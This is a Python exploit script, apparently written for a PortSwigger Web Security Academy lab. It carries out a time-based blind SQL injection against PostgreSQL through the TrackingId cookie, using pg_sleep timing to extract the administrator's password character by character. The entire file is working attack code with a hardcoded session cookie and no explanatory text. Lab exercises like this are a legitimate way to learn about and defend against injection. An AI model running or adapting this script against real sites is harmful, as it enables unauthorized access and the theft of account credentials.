from pwn import * 
import time, string, sys, pdb, signal, requests, subprocess

def ctrl_c():
    print("\n\n[!] Quiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

######################################

main_url='https://0ad30039046cc5cec0efd7dd00650046.web-security-academy.net'
characters=string.ascii_lowercase + string.digits
payload="||select case substring(password,%d,1)='%s' then pg_sleep(5) else pg_sleep(0) end from users where username='administrator'"


def run():
  
    subprocess.run('clear')

    password = ''

    p1 = log.progress('Brute force')
    p1.status('Initializating script...')
    
    time.sleep(2)
    
    p2 = log.progress('Password')
    
    for position in range(1,21):
        for payload in characters:
             
            cookie = {
                "TrackingId": "aKdlFEp81uOYCoGa'||(select case when substring(password,%d,1)='%s' then pg_sleep(5) else pg_sleep(0) end from users where username='administrator')-- -" % (position, payload),
                "session": 'YoqJ6aoDckikYoL1B3BBYa2YhUU4r2RT'
            }
            
            p1.status(cookie['TrackingId'])
            
            time_start = time.time()
            
            r = requests.get(main_url, cookies=cookie)
            
            time_end = time.time()
            
            if time_end - time_start > 5:
                password += payload
                p2.status(password)
                break
            
        
if __name__ == "__main__":
    run()
